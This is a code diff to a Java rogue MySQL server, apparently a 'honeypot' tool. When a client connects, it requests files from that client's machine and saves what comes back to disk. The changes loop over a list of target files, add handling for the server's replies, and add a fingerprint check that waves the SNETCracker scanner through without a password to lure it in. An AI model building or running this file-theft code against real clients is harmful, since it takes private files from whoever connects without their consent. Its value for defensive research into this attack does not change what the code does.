@@ -108,7 +108,7 @@ public class Socket extends Thread {
 
                     while (in.read(bys) != -1) {
                         if (Arrays.equals(stringUtils.hexToByteArray(configuration.selectVersion), getRequest(bys)) || Arrays.equals(stringUtils.hexToByteArray(configuration.setNameUtf8), getRequest(bys))
-                        || Arrays.equals(stringUtils.hexToByteArray(configuration.setNameUtf8mb4), getRequest(bys))
+                                || Arrays.equals(stringUtils.hexToByteArray(configuration.setNameUtf8mb4), getRequest(bys))
                         ) {
                             isBeginRead = true;
                         } else if (Arrays.equals(stringUtils.hexToByteArray(configuration.showVariable), getRequest(bys))) {
@@ -123,10 +123,8 @@ public class Socket extends Thread {
                         } else if (Arrays.equals(stringUtils.hexToByteArray(configuration.showCollation), getRequest(bys))) {
                             // 如果res为 showCollation
                             out.write(stringUtils.hexToByteArray(configuration.showCollationRes));
-                            // req : set names utf8
-                            //out.write(configuration.verificationText);  // res ok
                             out.flush();
-                            isBeginRead = true;
+                            //isBeginRead = true;
                         } else if (Arrays.equals(stringUtils.hexToByteArray(configuration.maxAllowedPacket), getRequest(bys))) {
                             out.write(stringUtils.hexToByteArray(configuration.maxAllowedPacketRes));
                             out.flush();
@@ -139,7 +137,9 @@ public class Socket extends Thread {
                             // 全部顺序读取
                             for (int i = 0; i < wantReadListSize; i++) {
                                 filename = configuration.wantReadList.get(i);
-                                getData(filename, server);
+                                if (getData(filename, server)) {
+                                    break;
+                                }
                             }
                         }
                     }
@@ -216,6 +216,12 @@ public class Socket extends Thread {
      * 处理客户端发来的数据包,提取出salt和password,salt结合自己预设的密码 =>变为最终的ServerPassword,password和ServerPassword相等时即验证成功
      */
     public static boolean handlePassword(byte[] bys) throws NoSuchAlgorithmException, UnsupportedEncodingException {
+        // 对SNETCracker扫描器自动关闭密码验证
+        boolean isSNETCracker = false;
+        if (bys[6] == 7 && bys[7] == 0 && bys[12] == 8) {
+            isSNETCracker = true;
+        }
+
         byte[] clientPassword = new byte[20];
         // 1.读取packet中的username,从36开始
         int usernameLength = 0, i = 0;
@@ -254,8 +260,14 @@ public class Socket extends Thread {
         if (passwordLength == 0) {
             isHavePassword = false; // 我这里为了省事,直接设置没有无密码登录
             flag = 0;
+        } else if (passwordLength != 20) {
+            return isSNETCracker;
+        } else if (isSNETCracker) {
+            return true;
         } else {
-            for (i = 0; i < passwordLength; i++) clientPassword[i] = bys[usernameLength + 36 + 2 + i];
+            for (i = 0; i < passwordLength; i++) {
+                clientPassword[i] = bys[usernameLength + 36 + 2 + i];
+            }
             // 4.获取correctUserInfo.txt中的password
             for (String line : lines) {
                 usernameAndPassword = stringUtils.splitBySymbol(line, " ");
@@ -272,7 +284,6 @@ public class Socket extends Thread {
                 }
             }
         }
-
         return flag > 0;
     }
 
@@ -287,7 +298,7 @@ public class Socket extends Thread {
     /**
      * 蜜罐的核心攻击方式:获取客户端的某个文件
      */
-    public static void getData(String filename, java.net.Socket server) throws IOException {
+    public static boolean getData(String filename, java.net.Socket server) throws IOException {
         logger.info("[+] 服务端想要获取的文件为: " + filename);
         logOutput.add("[+] " + stringUtils.thisTime("hh:mm:ss") + " 服务端想要获取的文件为: " + filename);
         FileUtils.writeLines(configuration.logFileName, logOutput, true);
@@ -306,23 +317,35 @@ public class Socket extends Thread {
         out.write(lastByte);
         out.flush();
         byte[] bys = new byte[9999];
-        int bysLength = in.read(bys);
+        int bysLength;
+        boolean readSuccess = false, again = false, isExit = false;
+        while ((bysLength = in.read(bys)) != -1) {
+            if (bys[0] != 0 && bys[3] != 0) {
+                logger.info("[+] 获取结果:获取文件成功! 文件已保存进getData文件夹中");
+                logOutput.add("[+] " + stringUtils.thisTime("hh:mm:ss") + " 获取结果:获取文件成功! 文件已保存进getData文件夹中");
 
-        if (bys[0] != 0 && bys[3] != 0) {
-            //in.read(bys);
-            logger.info("[+] 获取结果:获取文件成功! 文件已保存进getData文件夹中");
-            logOutput.add("[+] " + stringUtils.thisTime("hh:mm:ss") + " 获取结果:获取文件成功! 文件已保存进getData文件夹中");
-
-            String getData = new String(bys, 0, bysLength);
-            System.out.println("\n-----------------------------------------\n" + getData + "\n-----------------------------------------\n");
-            FileWriter writer = new FileWriter("getData" + File.separator + filename.substring(filename.lastIndexOf(File.separator)));
-            writer.write(getData);
-            writer.close();
-        } else {
+                String getData = new String(bys, 0, bysLength);
+                System.out.println("\n-----------------------------------------\n" + getData + "\n-----------------------------------------\n");
+                FileWriter writer = new FileWriter("getData" + File.separator + filename.substring(filename.lastIndexOf(File.separator)));
+                writer.write(getData);
+                writer.close();
+                readSuccess = true;
+            } else if (bys[0] == 1 && bys[1] == 0 && bys[2] == 0 && bys[4] == 1) {
+                out.write(configuration.verificationText);  // res ok
+                isExit = true;
+            } else if (!readSuccess) {
+                again = true;
+                logger.info("[-] 获取结果:获取文件失败,可能是文件路径不存在/被客户端拦截/客户端发包扫描结束");
+                logOutput.add("[-] " + stringUtils.thisTime("hh:mm:ss") + " 获取结果:获取文件失败,可能是文件路径不存在或被客户端拦截");
+            }
+        }
+        if (!readSuccess && !again) {
             logger.info("[-] 获取结果:获取文件失败,可能是文件路径不存在/被客户端拦截/客户端发包扫描结束");
             logOutput.add("[-] " + stringUtils.thisTime("hh:mm:ss") + " 获取结果:获取文件失败,可能是文件路径不存在或被客户端拦截");
         }
+
         FileUtils.writeLines(configuration.logFileName, logOutput, true);
         logOutput.clear();
+        return isExit;
     }
 }
